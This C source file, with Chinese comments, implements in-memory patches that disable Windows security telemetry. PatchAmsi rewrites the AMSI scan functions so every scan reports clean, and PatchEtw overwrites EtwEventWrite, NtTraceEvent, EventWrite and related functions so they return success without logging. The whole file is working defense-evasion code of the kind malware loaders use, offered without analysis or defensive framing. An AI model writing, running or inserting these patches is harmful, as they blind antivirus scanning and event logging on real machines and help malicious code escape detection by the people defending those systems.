#include "bypass.h"
#include <stdio.h>

/* ---------- 原始字节写入 + 指令缓存刷新 ---------- */
static BOOL PatchBytes(LPVOID addr, const void *p, SIZE_T n)
{
    DWORD old = 0;
    if (!addr) return FALSE;
    if (!VirtualProtect(addr, n, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    memcpy(addr, p, n);
    FlushInstructionCache(GetCurrentProcess(), addr, n);
    VirtualProtect(addr, n, old, &old);
    return TRUE;
}

/*
 * amsi!AmsiScanBuffer(HAMSICONTEXT, PVOID, ULONG, LPCWSTR, AMSI_OPTION, AMSI_RESULT*)
 * x64 参数分布:
 *   rcx=context  rdx=buf  r8=len  r9=name
 *   [rsp+0x28]=options   [rsp+0x30]=result  <- 6th
 *
 * patch:
 *   48 8B 44 24 30                mov rax, qword ptr [rsp+0x30]
 *   C7 00 00 00 00 00             mov dword ptr [rax], 0      ; AMSI_RESULT_CLEAN
 *   33 C0                         xor eax, eax                ; S_OK
 *   C3                            ret
 */
BOOL PatchAmsi(void)
{
    HMODULE h = GetModuleHandleW(L"amsi.dll");
    if (!h) h = LoadLibraryW(L"amsi.dll");
    if (!h) return FALSE;

    static const unsigned char patch_buf[] = {
        0x48, 0x8B, 0x44, 0x24, 0x30,
        0xC7, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x33, 0xC0,
        0xC3
    };

    BOOL ok = FALSE;
    const char *targets[] = { "AmsiScanBuffer", "AmsiScanString", "AmsiScanStringAndData" };
    for (int i = 0; i < 3; i++) {
        LPVOID p = (LPVOID)GetProcAddress(h, targets[i]);
        if (p) ok |= PatchBytes(p, patch_buf, sizeof(patch_buf));
    }
    return ok;
}

/* ntdll!EtwEventWrite -> 33 C0 C3  (xor eax,eax; ret => STATUS_SUCCESS) */
BOOL PatchEtw(void)
{
    HMODULE h = GetModuleHandleW(L"ntdll.dll");
    if (!h) return FALSE;

    static const unsigned char ret0[] = { 0x33, 0xC0, 0xC3 };

    BOOL ok = FALSE;
    const char *targets[] = {
        "EtwEventWrite",
        "EtwEventWriteEx",
        "EtwEventWriteFull",
        "EtwEventWriteTransfer",
        "NtTraceEvent",
        "ZwTraceEvent",
        "NtTraceControl"
    };
    for (int i = 0; i < 7; i++) {
        LPVOID p = (LPVOID)GetProcAddress(h, targets[i]);
        if (p) ok |= PatchBytes(p, ret0, sizeof(ret0));
    }

    /* advapi32 用户态 provider 入口（若已加载） */
    HMODULE a = GetModuleHandleW(L"advapi32.dll");
    if (a) {
        LPVOID p = (LPVOID)GetProcAddress(a, "EventWrite");
        if (p) ok |= PatchBytes(p, ret0, sizeof(ret0));
    }
    return ok;
}
